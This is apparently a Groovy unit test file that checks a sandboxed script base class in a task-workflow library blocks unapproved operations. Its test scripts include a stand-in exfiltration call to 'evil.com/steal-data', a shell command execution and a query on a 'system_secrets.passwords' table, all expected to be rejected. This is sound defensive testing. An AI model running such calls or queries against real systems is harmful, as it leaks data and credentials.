package org.softwood.dag.task

import org.junit.jupiter.api.Test
import org.softwood.dag.task.examples.EnterpriseScriptBase

import static org.junit.jupiter.api.Assertions.*

/**
 * Tests for ScriptTask custom script base class functionality.
 *
 * Demonstrates how library consumers can provide their own
 * security models through custom script base classes.
 */
class ScriptTaskCustomBaseTest {

    @Test
    void testDefaultSecureScriptBase() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-secure", "Test Secure", ctx)

        task.with {
            sandboxed true  // Default
            script '''
                def result = [1, 2, 3].sum()
                return result
            '''
        }

        def result = task.start().get()
        assertEquals(6, result)
    }

    @Test
    void testCustomScriptBaseClass() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-custom", "Test Custom", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Use enterprise-approved operations
                writeAuditLog("Starting processing")
                def data = queryDatabase("SELECT * FROM financial_data.accounts")
                writeAuditLog("Processing completed")
                return data.size()
            '''
        }

        def result = task.start().get()
        assertEquals(2, result)  // Mock data returns 2 rows
    }

    @Test
    void testCustomScriptBaseBlocksUnapprovedOperations() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-blocked", "Test Blocked", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Try to execute shell command (should be blocked)
                "ls -la".execute()
            '''
        }

        def exception = assertThrows(Exception) {
            task.start().get()
        }

        assertTrue(
            exception.message?.contains("not allowed") ||
            exception.cause?.message?.contains("not allowed"),
            "Should throw SecurityException for blocked operation"
        )
    }

    @Test
    void testCustomScriptBaseBlocksUnapprovedDatabaseSchema() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-schema", "Test Schema", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Try to query unapproved schema
                queryDatabase("SELECT * FROM system_secrets.passwords")
            '''
        }

        def exception = assertThrows(Exception) {
            task.start().get()
        }

        assertTrue(
            exception.message?.contains("not approved") ||
            exception.cause?.message?.contains("not approved"),
            "Should throw SecurityException for unapproved schema"
        )
    }

    @Test
    void testCustomScriptBaseBlocksExternalApiCalls() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-external", "Test External", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // Try to call external API
                callInternalApi("https://evil.com/steal-data")
            '''
        }

        def exception = assertThrows(Exception) {
            task.start().get()
        }

        assertTrue(
            exception.message?.contains("not allowed") ||
            exception.cause?.message?.contains("not allowed"),
            "Should throw SecurityException for external API call"
        )
    }

    @Test
    void testCustomScriptBaseAllowsApprovedOperations() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-approved", "Test Approved", ctx)

        task.with {
            customScriptBaseClass EnterpriseScriptBase
            script '''
                // All approved operations
                writeAuditLog("Starting")
                def dbData = queryDatabase("SELECT * FROM financial_data.accounts")
                def apiData = callInternalApi("https://api.example.com/endpoint")
                writeAuditLog("Completed")

                return [
                    dbRecords: dbData.size(),
                    apiStatus: apiData.status
                ]
            '''
        }

        def result = task.start().get()
        assertEquals(2, result.dbRecords)
        assertEquals(200, result.apiStatus)
    }

    @Test
    void testCustomScriptBaseClassValidation() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-invalid", "Test Invalid", ctx)

        // Try to set invalid script base class
        assertThrows(IllegalArgumentException) {
            task.customScriptBaseClass(String.class)  // Not a Script subclass
        }
    }

    @Test
    void testCustomScriptBaseEnablesSandboxing() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-auto-sandbox", "Test Auto Sandbox", ctx)

        task.with {
            sandboxed false  // Initially disabled
            customScriptBaseClass EnterpriseScriptBase  // This should enable it
        }

        // Verify sandboxing was automatically enabled
        assertTrue(task.sandboxed, "Setting customScriptBaseClass should enable sandboxing")
    }

    @Test
    void testNullCustomScriptBaseClassThrowsException() {
        def ctx = new TaskContext()
        def task = new ScriptTask("test-null", "Test Null", ctx)

        assertThrows(IllegalArgumentException) {
            task.customScriptBaseClass(null)
        }
    }
}
